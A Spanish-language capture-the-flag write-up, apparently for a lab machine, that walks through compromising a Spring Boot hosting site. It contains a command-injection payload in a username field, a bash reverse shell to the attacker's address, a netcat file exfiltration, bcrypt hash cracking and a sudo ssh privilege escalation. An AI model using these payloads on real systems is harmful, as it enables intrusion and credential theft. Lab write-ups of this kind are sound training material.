___
IP víctima: 10.129.231.170
IP atacante: 10.10.17.184

Comprobamos que tenemos conexión con la máquina

![[cozy_ping.png]]

TTL = 63 -> Máquina Linux

___
# 1. Reconocimiento

Hacemos un nmap para ver posibles puertos abiertos

![[cozy_nmap.png]]

Puertos abierto:

- 22 | SSH | Versión: OpenSSH 8.9p1 Ubuntu
- 80 | HTTP | nginx 1.18.0

Entramos a la página web para explorar el contenido

![[cozy_interfaz.png]]

Es una página de hosting, no tiene nada interesante y solo esta el panel de login, pero no tenemos ningún usuario para autenticarnos.

Si clickamos a la imagen del banner, nos saldrá un error Whitelabel Error Page, por lo que buscamos qué significa y nos pondrá que proviene de SpringBoot, asi que hacemos fuzzing con un diccionario con rutas comunes de este.

![[cozy_whitelabel.png]]

![[cozy_search.png|700]]

![[cozy_ffuf.png|800]]

Viendo las rutas descubiertas, si entramos a actuator/sessions podemos ver una cookie_ID del usuario `kanderson`, por lo que se acontece una vulnerabilidad cookie highjacking. La copiamos y la pegamos en el apartado del panel de login.

![[cozy_cookieid.png]]

![[cozy_cookiehighjacking.png]]

Ya logueados, si nos desplazamos hacia abajo, podemos ver un apartado para incluir un servidor para una aplicación automática de parches, nos pide un hostname y username. Podemos probar a que se agregue  el servidor`localhost` y en el usuario hacemos un curl a un servidor python local agregando el comando junto con el usuario comentado.

![[cozy_command.png]]

![[cozy_pythonserver.png]]

Esto es capáz de realizarse debido al agregar un usuario y contraseña, intenta una conexión ssh por detrás.

```text
test;curl${IFS}10.10.17.214/test;#

Esto hace -> ssh -i private_key test;curl${IFS}10.10.17.214/test;# - Comenta todo después del #
```

Entonces hacemos un archivo index.html (porque es lo que busca python) con el comando para enviarnos una reverseshell por el puerto 443 que estará en escucha con netcat.

index.html:
```html
#!/bin/bash

bash -i >& /dev/tcp/10.10.17.214/443 0>&1
```

![[cozy_commandinjection.png]]

![[cozy_revershell.png]]

Logramos obtener una reverse shell, asi que aplicamos un tratamiento de tty para que sea más comodo usar la terminal.

```bash
script /dev/null -bash
#Ctrl + Z
stty raw -c echo;fg
reset xterm
export TERM=xterm
```

Aplicamos un proceso de búsqueda para enumerar usuarios y escalar privilegios

![[cozy_users.png]]

Tenemos la usuario josh y postgres, lo que significa que usa el motor PostgreSQL para la base de datos.

```bash
find / -perm -4000 2>/dev/null # Archivos con permisos SUID
getcap -r / 2>/dev/null # Capabilities del sistema
ss -ntlp # Conexiones internas
```

Ejeuctando `ss -ntlp` podemos ver que hay un puerto 8080 local y al hacer `ps -faux | grep java` podemos ver que está lanzando la web desde el directorio `cloudhosting-0.0.1.jar`, el cual tenemos en la carpeta `/app` y podemos enviar a nuestro equipo para examinarlo.

![[cozy_appjava.png]]

Otra forma de verlo: `cat /proc/999/cmdline;echo` -> 999 | PID

Para enviarnos el archivo a nuestro equipo:

Ponemos en escucha el puerto 443 y todo lo que llegue se pondrá en un archivo llamado `cloudhosting_0.0.1.jar`

![[cozy_nc443file.png]]

Desde la shell de la víctima, enviamos el archivo a nuestra máquina

![[cozy_sendjar.png]]

Ya que lo tenemos, procedemos a abrirlo con `jd-gui`

```bash
jd-gui cloudhosting-0.0.1.jar
```

![[cozy_databaseuser.png]]

Obtenemos las credenciales del usuario `postgre` de la base de datos, asi que nos conectamos y recolectamos información.

![[cozy_userpostgres.png]]

![[cozy_database.png]]

Nos conectamos a la base de datos `cozyhosting` y listamos los usuarios existentes

![[cozy_userstable.png]]

![[cozy_passwords.png]]

Vemos las contraseñas encriptadas, asi que usamos hashcat para desencriptarlas. Para ellos, guardamos ambos hashes en un solo archivo.

```bash
hashcat hashes /usr/share/wordlists/rockyou.txt -m 3200 # 3200 -> bcrypt
```

admin pass: manchesterunited

Probamos dicha contraseña con el usuario `josh` para ver si hay reutilización de credenciales, nos conectamos por ssh.

```bash
ssh josh@10.129.229.88
```

Sí se puede y vemos la flag del usuario. Ahora aplicamos el mismo proceso para escalar privilegios.

![[cozy_userflag.png]]

```bash
find / -perm -4000 2>/dev/null # Archivos con permisos SUID
getcap -r / 2>/dev/null # Capabilities del sistema
sudo -l # Ejecución de comandos
```

![[cozy_sudoperm.png]]

Observamos que el usuario josh puede ejecutar el binario ssh como root, asi que buscamos un payload para escalar privilegios en GTFOBins.

![[cozy_finally.png]]